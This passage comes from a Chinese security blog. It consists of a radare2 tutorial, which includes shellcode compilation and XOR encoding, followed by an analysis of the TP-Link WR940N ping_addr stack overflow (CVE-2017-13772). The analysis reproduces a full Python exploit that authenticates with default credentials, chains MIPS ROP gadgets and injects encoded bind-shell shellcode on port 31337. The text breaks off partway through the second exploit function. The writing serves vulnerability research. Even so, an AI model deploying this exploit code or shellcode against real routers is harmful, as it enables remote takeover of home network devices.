class="line">adAe  16 32 64   bf          LGPL3   Brainfuck (by pancake, nibble) v4.0.0</div><div class="line">_dA_  16         cr16        LGPL3   cr16 disassembly plugin</div></pre></td></tr></table></figure>
<p>使用 <code>arm</code> 插件，汇编 三条 <code>nop</code> 指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rasm2 -a arm &quot;nop;nop;nop;&quot;</div><div class="line">0000a0e10000a0e10000a0e1</div></pre></td></tr></table></figure>
<p>然后我们使用 <code>-d</code> 把它反汇编出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rasm2 -a arm -d 0000a0e10000a0e10000a0e1</div><div class="line">mov r0, r0</div><div class="line">mov r0, r0</div><div class="line">mov r0, r0</div></pre></td></tr></table></figure>
<p>我可以在命令后面加上 <code>-r</code> 打印出在 <code>radare2</code>中实现对应的功能，需要使用的命令( <code>wa</code> 命令的作用是，汇编给出的指令，并把汇编得到的数据写到相应位置，默认是当前位置)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rasm2 -a arm -d 0000a0e10000a0e10000a0e1 -r</div><div class="line">e asm.arch=arm</div><div class="line">e asm.bits=32</div><div class="line">&quot;wa mov r0, r0;mov r0, r0;mov r0, r0;&quot;</div></pre></td></tr></table></figure></p>
<h3 id="ragg2-ragg2·cc"><a href="#ragg2-ragg2·cc" class="headerlink" title="ragg2/ragg2·cc"></a>ragg2/ragg2·cc</h3><p><code>radare2</code> 自己实现的 c 编译器，可以方便的写<code>shellcode</code> .<br>示例一：</p>
<p>代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int main() &#123; write (1,&quot;hi\n&quot;, 3); exit(0); &#125;</div></pre></td></tr></table></figure></p>
<p>使用下面的命令，把它编译成x86 32位代码：</p>
<p><code>ragg2-cc -a x86 -b 32 -d -o test test.c</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509456151971l3h3i5vj.png?imageslim" alt="paste image"></p>
<p>可以生成正常的 <code>elf</code> 文件用于测试，可以使用 <code>-c</code> 只编译出 <code>shellcode</code> </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15094562677604lzx38lm.png?imageslim" alt="paste image"><br>生成的 <code>shellcode</code> 存在于 <code>test.c.text</code> 文件里面，下面是用 <code>radare2</code> 反汇编得到的代码，可以看到使用了 系统调用来实现代码的功能。</p>
<p>使用 <code>ragg2-cc</code> 生成的 <code>shellcode</code> 可以使用 <code>ragg2</code>中的 <code>xor</code> 编码器来编码字符，绕过一些字符限制，比如 <code>\x00</code>。<br>首先生成<code>shellcode</code> 的16进制表示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ragg2-cc -a x86 -b 32 -d -x test.c</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150945684017052tc8caw.png?imageslim" alt="paste image"></p>
<p>然后使用 <code>rasm2</code> 验证下</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509456968736cujc5nti.png?imageslim" alt="paste image"><br>代码和上面的是一样的。<br>然后使用 <code>ragg2</code> 使用 <code>xor</code> 编码器编码 <code>shellcode</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509457754035xiiwmp5s.png?imageslim" alt="paste image"></p>
<p>就是在 <code>shellcode</code> 执行前使用 <code>xor</code> 指令把<code>shellcode</code> 还原。这样就可以消除掉一些坏字符。</p>
<p><code>ragg2</code> 也有自己 编写 <code>shellcode</code> 的语法。下面是一个示例，具体请看官方文档。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509458272098w4gx320m.png?imageslim" alt="paste image"></p>
<p>使用这种方式，我们就能使用最接近 <code>汇编</code> 的类c语言 来编写跨平台 <code>shellcode</code></p>
<h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><p>用于使用加密算法，hash算法等计算值</p>
<p>使用<code>-L</code> 可以列举支持的算法，比如算算 md5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rahash2 -a md5 -s admin</div><div class="line">0x00000000-0x00000004 md5: 21232f297a57a5a743894a0e4a801fc3</div></pre></td></tr></table></figure></p>
<h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><p>最常用的工具了。整合了上面所有的工具。直接使用 <code>r2 target_bin</code> 进入程序。使用<code>-d</code> 选项进入调试模式。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509458880413jxib0gco.png?imageslim" alt="paste image"><br><code>radare2</code> 中的命令格式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[.][times][cmd][~grep][@[@iter]addr!size][|&gt;pipe] ;</div></pre></td></tr></table></figure></p>
<p><code>px</code>表示打印16进制数，默认从当前位置开始。参数控制打印的字节数，下面这张图应该就可以大概解释上面的格式了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459118495u8fvnh9m.png?imageslim" alt="paste image"></p>
<p><code>@ addr</code> 表示该命令从 <code>addr</code> 开始执行。<code>addr</code> 不一定是 地址也可以是 <code>radare2</code> 中识别的符号，比如 <code>main</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150945933341282rex3iw.png?imageslim" alt="paste image"><br>还有一个重要的东西要记得，在命令的后面加个 <code>?</code> ，就可以查看帮助。直接输入<code>?</code> 可以查看所有的命令。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459469161neog4ssx.png?imageslim" alt="paste image"></p>
<p>下面按照我们在 <code>ida</code> 中使用的功能，来介绍 <code>radare2</code><br>首先在 用 <code>ida</code> 分析程序时，在 <code>ida</code> 加载程序后默认会对程序进行分析。<code>radare2</code> 相应的功能是以 <code>a</code> 开头的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459639393vrpsfsr3.png?imageslim" alt="paste image"><br>注释很简明了。我们使用 <code>aaa</code> 就可以进行完整分析了。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459732526wt8fv8vk.png?imageslim" alt="paste image"></p>
<p>分析前 <code>radare2</code> 识别不了函数，分析后就可以正常打印函数代码了（<code>pdf</code> 打印函数代码）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459800808z40o2w75.png?imageslim" alt="paste image"></p>
<p>有时候我们不需要分析整个 二进制文件，或者有个函数  <code>radare2</code>没有识别出来我们可以 <code>af</code> 来分析该函数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460038689y3ejljvr.png?imageslim" alt="paste image"></p>
<p>我们可以使用  <code>s</code> 跳转到想要跳转的位置。<br>跳转到 <code>main</code> 函数，并 定义该函数，然后打印函数代码</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15094601604612rtzywu2.png?imageslim" alt="paste image"></p>
<p><code>pd</code>  类命令用于打印汇编信息。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460248195wabrhoh5.png?imageslim" alt="paste image"></p>
<p>具体看帮助。<br>使用 <code>VV</code> 进入 图形化模式（需要是函数范围内）。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15094603917512ee12s3o.png?imageslim" alt="paste image"><br>在图形化模式下，输入 <code>?</code> 可以查看图形化模式的帮助。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460451292vd4u4cma.png?imageslim" alt="paste image"></p>
<p>使用 <code>hjkl</code> 来移动图形</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460648267s237v95k.png?imageslim" alt="paste image"></p>
<p>使用 <code>p/P</code>  切换图形模式</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460704922bax3wo07.png?imageslim" alt="paste image"></p>
<p>在图形模式下使用 <code>:</code> 可以输入<code>radare2</code> 命令</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461026761tbpeekgu.png?imageslim" alt="paste image"></p>
<p>输入 <code>!</code> ， 在调试的时候应该很有用</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461098057g2hz9wjr.png?imageslim" alt="paste image"></p>
<p>使用 空格 ，切换图形模式和文本模式</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460817550ho8w5er5.png?imageslim" alt="paste image"></p>
<p>在文本模式模式下也可以使用 <code>p</code> 来切换视图。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460884141o5b4k28f.png?imageslim" alt="paste image"><br>剩下的看帮助。</p>
<p>下面介绍如何使用 <code>radare2</code> patch程序。首先需要在打开文件时使用 <code>r2 -w</code> 来以可写模式打开文件，这样 <code>pathch</code> 才能应用到文件 ( 或者在 <code>radare2</code> 下使用 <code>e io.cache=true</code>, 来允许进行 <code>patch</code>, 不过这样的话文件的修改不会影响原文件 )</p>
<p><code>w</code> 系列命令用于修改文件。</p>
<p>使用 <code>wa</code> 可以使用 汇编指令进行 <code>patch</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461504180vks7xzbj.png?imageslim" alt="paste image"></p>
<p>使用 <code>&quot;wa nop;nop;nop;nop;&quot;</code> 可以同时写入多条指令。<br><code>双引号不能省</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461564911w4lzfklw.png?imageslim" alt="paste image"><br>或者可以使用 <code>wx</code> 写入 16进制数据<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461691131dl2qawda.png?imageslim" alt="paste image"><br>其他的请看 <code>w?</code> ，查看帮助。</p>
<p>还可以 <code>可视化汇编/patch</code> 程序</p>
<p>输入 <code>Vp</code> ，然后输入 <code>A</code>, 就可以了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461967246b3yfuntc.png?imageslim" alt="paste image"></p>
<p>使用 <code>/</code> 系列命令可以搜索字符串， rop gadgets等</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15094620829681a9ko1pz.png?imageslim" alt="paste image"></p>
<p>查询字符串交叉引用可以依次使用下列方法。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509462186812m98x995a.png?imageslim" alt="paste image"></p>
<p><code>ax?</code> 系列命令用于管理交叉引用。 <code>/r</code> 可以搜索交叉引用,  <code>aae</code>  是使用<code>radare2</code>中的模拟执行功能，动态的检测交叉引用。</p>
<p><strong>下面画重点</strong></p>
<p><code>radare2</code>中其实也是有 <code>反编译功能</code>, 使用 <code>pdc</code>  就可以查看伪代码，虽然和 <code>ida</code> 的还有很大的差距，但是在一些  <code>ida</code>  不支持 <code>f5</code> 的情况下这个功能还是不错的，可以用来看程序的大概逻辑。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509462614283a92qwc4d.png?imageslim" alt="paste image"></p>
<p>在图形化模式下，按下 <code>$</code> 看看，有惊喜。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509462803351x6n0h9gz.png?imageslim" alt="paste image"><br>帮我们解析汇编指令，用 c 代码的格式来显示。妈妈再也不用担心我不会汇编了。</p>
<p><code>radare2</code>和  <code>ida</code> 相比还有一个最大的优势，那就是它自带模拟执行功能。它使用了一种 <code>esil</code> 语言，来定义程序的行为，并且可以根据这个来模拟执行程序代码。 </p>
<p><code>ESIL</code> 的具体语法可以去看官方文档。下面列举两个示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov ecx, ebx -&gt; ebx,ecx,=</div><div class="line">add ebx, edi -&gt;edi,ebx,+=,$o,of,=,$s,sf,=,$z,zf,=,$c31,cf,=,$p,</div></pre></td></tr></table></figure>
<p>可以使用 <code>e asm.esil = true</code>显示 <code>esil</code> 代码</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509464681373qlis3k0v.png?imageslim" alt="paste image"><br>和 <code>ESIL</code>相关的命令是 </p>
<p><code>ae?</code>这一类指令。这个我也不熟悉，大概的用法是，使用 <code>ae?</code>这一类指令设置好 指令执行虚拟机的状态，然后设置好模拟执行的终止状态，在停止时，做一些操作，主要用于解密字符串，脱壳等等。</p>
<p>具体事例可以看：</p>
<p><a href="https://blog.xpnsec.com/radare2-using-emulation-to-unpack-metasploit-encoders/" target="_blank" rel="external">https://blog.xpnsec.com/radare2-using-emulation-to-unpack-metasploit-encoders/</a></p>
<p>此外 <code>radare2</code>还支持各种语言对他进行调用， 以及拥有大量的插件。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> <code>radare2</code>还是很强大的，特别是全平台反编译，全平台模拟执行，各种文件的patch, 修改。感觉在 ida 没法 <code>f5</code>的平台上首选 <code>radare2</code></p>
<p> 参考：</p>
<p> <a href="http://radare.org/r/talks.html" target="_blank" rel="external">http://radare.org/r/talks.html</a></p>
<p> <a href="https://github.com/radare/radare2book" target="_blank" rel="external">https://github.com/radare/radare2book</a></p>
<p> <a href="https://codeload.github.com/radareorg/r2con/" target="_blank" rel="external">https://codeload.github.com/radareorg/r2con/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> radare2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之wr940栈溢出漏洞分析与利用]]></title>
      <url>/2017/10/29/step_by_step_pwn_router_part5.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
<hr>
<p>这个是最近爆出来的漏洞，漏洞编号：<a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">CVE-2017-13772</a></p>
<p>固件链接：<a href="http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip" target="_blank" rel="external">http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip</a></p>
<p>之前使用 <code>firmadyn</code> 可以正常模拟运行，但是调试不了，就没有仔细看这个漏洞。今天突然想起 他会启动一个 <code>ssh</code> 服务，那我们是不是就可以通过<code>ssh</code> 连上去进行调试，正想试试，又不能正常模拟了。。。。。下面看具体漏洞。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>漏洞位与 管理员用来     <code>ping</code> 的功能，程序在获取<code>ip</code> 地址时没有验证长度，然后复制到栈上，造成栈溢出。搜索关键字符串 <code>ping_addr</code> 定位到函数 <code>sub_453C50</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15092873431355nyiesez.png?imageslim" alt="paste image"><br>获取 <code>ip</code> 地址后，把字符串指针放到 <code>$s6</code>寄存器，跟下去看看。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509287498785ykojz8u0.png?imageslim" alt="paste image"></p>
<p>传入了<code>ipAddrDispose</code>函数，继续分析之：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509287595268qwyfsd2y.png?imageslim" alt="paste image"><br>先调用了 <code>memset</code>  初始化缓冲区，然后调用 <code>strcpy</code> 把 <code>ip</code> 地址复制到栈上，溢出。</p>
<p>利用的话和前文是一样的，经典的栈溢出，经典的 rop。</p>
<p><a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-28-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8Brop%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html">一步一步pwn路由器之rop技术实战</a></p>
<p><a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">一步一步pwn路由器之路由器环境修复&amp;&amp;rop技术分析</a></p>
<p>附上参考链接里的 <code>exp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">import urllib2</div><div class="line">import base64</div><div class="line">import hashlib</div><div class="line">from optparse import *</div><div class="line">import sys</div><div class="line">import urllib</div><div class="line"></div><div class="line">banner = (</div><div class="line">&quot;___________________________________________________________________________\n&quot;</div><div class="line">&quot;WR940N Authenticated Remote Code Exploit\n&quot;</div><div class="line">&quot;This exploit will open a bind shell on the remote target\n&quot;</div><div class="line">&quot;The port is 31337, you can change that in the code if you wish\n&quot;</div><div class="line">&quot;This exploit requires authentication, if you know the creds, then\n&quot;</div><div class="line">&quot;use the -u -p options, otherwise default is admin:admin\n&quot;</div><div class="line">&quot;___________________________________________________________________________&quot;</div><div class="line">)</div><div class="line"></div><div class="line">def login(ip, user, pwd):</div><div class="line">	print &quot;[+] Attempting to login to http://%s %s:%s&quot;%(ip,user,pwd)</div><div class="line">	#### Generate the auth cookie of the form b64enc(&apos;admin:&apos; + md5(&apos;admin&apos;))</div><div class="line">	hash = hashlib.md5()</div><div class="line">	hash.update(pwd)</div><div class="line">	auth_string = &quot;%s:%s&quot; %(user, hash.hexdigest())</div><div class="line">	encoded_string = base64.b64encode(auth_string)</div><div class="line"></div><div class="line">	print &quot;[+] Encoded authorisation: %s&quot; %encoded_string#### Send the request</div><div class="line">	url = &quot;http://&quot; + ip + &quot;/userRpm/LoginRpm.htm?Save=Save&quot;</div><div class="line">	print &quot;[+] sending login to &quot; + url</div><div class="line">	req = urllib2.Request(url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %encoded_string)</div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line">	#### The server generates a random path for further requests, grab that here</div><div class="line">	data = resp.read()</div><div class="line">	next_url = &quot;http://%s/%s/userRpm/&quot; %(ip, data.split(&quot;/&quot;)[3])</div><div class="line">	print &quot;[+] Got random path for next stage, url is now %s&quot; %next_url</div><div class="line">	return (next_url, encoded_string)</div><div class="line"></div><div class="line">#custom bind shell shellcode with very simple xor encoder</div><div class="line">#followed by a sleep syscall to flush cash before running</div><div class="line">#bad chars = 0x20, 0x00</div><div class="line">shellcode = (</div><div class="line">#encoder</div><div class="line">&quot;\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99&quot;</div><div class="line">&quot;\x27\xb2\x05\x4b&quot; #0x27b2059f for first_exploit</div><div class="line">&quot;\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xc1&quot;</div><div class="line"></div><div class="line">#sleep</div><div class="line">&quot;\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08&quot;</div><div class="line">&quot;\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa&quot;</div><div class="line">&quot;\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c&quot;</div><div class="line"></div><div class="line">################ encoded shellcode ###############</div><div class="line">&quot;\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06&quot;</div><div class="line">&quot;\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff&quot;</div><div class="line">&quot;\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d&quot;</div><div class="line">&quot;\x7a\x69&quot;            #&lt;————————- PORT 0x7a69 (31337)</div><div class="line">&quot;\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad&quot;</div><div class="line">&quot;\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc&quot;</div><div class="line">&quot;\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01&quot;</div><div class="line">&quot;\x01\x0c\x24\x0f\x73\x50&quot;</div><div class="line">&quot;\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f&quot;</div><div class="line">&quot;\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48&quot;</div><div class="line">&quot;\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f&quot;</div><div class="line">&quot;\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50&quot;</div><div class="line">&quot;\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f&quot;</div><div class="line">&quot;\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c&quot;</div><div class="line">&quot;\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce&quot;</div><div class="line">&quot;\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8&quot;</div><div class="line">&quot;\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02&quot;</div><div class="line">&quot;\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa&quot;</div><div class="line">&quot;\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c&quot;</div><div class="line">)</div><div class="line"></div><div class="line">###### useful gadgets #######</div><div class="line">nop = &quot;\x22\x51\x44\x44&quot;</div><div class="line">gadg_1 = &quot;\x2A\xB3\x7C\x60&quot;  # set $a0 = 1, and jmp $s1</div><div class="line">gadg_2 = &quot;\x2A\xB1\x78\x40&quot;</div><div class="line">sleep_addr = &quot;\x2a\xb3\x50\x90&quot;</div><div class="line">stack_gadg = &quot;\x2A\xAF\x84\xC0&quot;</div><div class="line">call_code = &quot;\x2A\xB2\xDC\xF0&quot;</div><div class="line"></div><div class="line">def first_exploit(url, auth):</div><div class="line">	#          trash $s1        $ra</div><div class="line">	rop = &quot;A&quot;*164 + gadg_2  + gadg_1 + &quot;B&quot;*0x20 + sleep_addr + &quot;C&quot;*4</div><div class="line">	rop += &quot;C&quot;*0x1c + call_code + &quot;D&quot;*4 + stack_gadg + nop*0x20 + shellcode</div><div class="line"></div><div class="line">	params = &#123;&apos;ping_addr&apos;: rop, &apos;doType&apos;: &apos;ping&apos;, &apos;isNew&apos;: &apos;new&apos;, &apos;sendNum&apos;: &apos;20&apos;, &apos;pSize&apos;: &apos;64&apos;, &apos;overTime&apos;: &apos;800&apos;, &apos;trHops&apos;: &apos;20&apos;&#125;</div><div class="line"></div><div class="line">	new_url = url + &quot;PingIframeRpm.htm?&quot; + urllib.urlencode(params)</div><div class="line"></div><div class="line">	print &quot;[+] sending exploit…&quot;</div><div class="line">	print &quot;[+] Wait a couple of seconds before connecting&quot;</div><div class="line">	print &quot;[+] When you are finished do http -r to reset the http service&quot;</div><div class="line"></div><div class="line">	req = urllib2.Request(new_url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %auth)</div><div class="line">	req.add_header(&apos;Referer&apos;, url + &quot;DiagnosticRpm.htm&quot;)</div><div class="line"></div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line"></div><div class="line">def second_exploit(url, auth):</div><div class="line">	url = url + &quot;WanStaticIpV6CfgRpm.htm?&quot;</div><div class="line">	#                 trash      s0      s1      s2       s3     s4      ret     shellcode</div><div class="line">	payload = &quot;A&quot;*111 + &quot;B&quot;*4 + gadg_2 + &quot;D&quot;*4 + &quot;E&quot;*4 + &quot;F&quot;*4 + gadg_1 + &quot;a&quot;*0x1c</div><div class="line">	payload += &quot;A&quot;*4 + sleep_addr + &quot;C&quot;*0x20 + call_code + &quot;E&quot;*4</div><div class="line">	payload += stack_gadg + &quot;A&quot;*4 +  nop*10 + shellcode + &quot;B&quot;*7</div><div class="line">	print len(payload)</div><div class="line"></div><div class="line">	params = &#123;&apos;ipv6Enable&apos;: &apos;on&apos;, &apos;wantype&apos;: &apos;2&apos;, &apos;ipType&apos;: &apos;2&apos;, &apos;mtu&apos;: &apos;1480&apos;, &apos;dnsType&apos;: &apos;1&apos;,</div><div class="line">	&apos;dnsserver2&apos;: payload, &apos;ipAssignType&apos;: &apos;0&apos;, &apos;ipStart&apos;: &apos;1000&apos;,</div><div class="line">	&apos;ipEnd&apos;: &apos;2000&apos;, &apos;time&apos;: &apos;86400&apos;, &apos;ipPrefixType&apos;: &apos;0&apos;, &apos;staticPrefix&apos;: &apos;AAAA&apos;,</div><div class="line">	&apos;staticPrefixLength&apos;: &apos;64&apos;, &apos;Save&apos;: &apos;Save&apos;, &apos;RenewIp&apos;: &apos;1&apos;&#125;</div><div class="line"></div><div class="line">	new_url = url + urllib.urlencode(params)</div><div class="line"></div><div class="line">	print 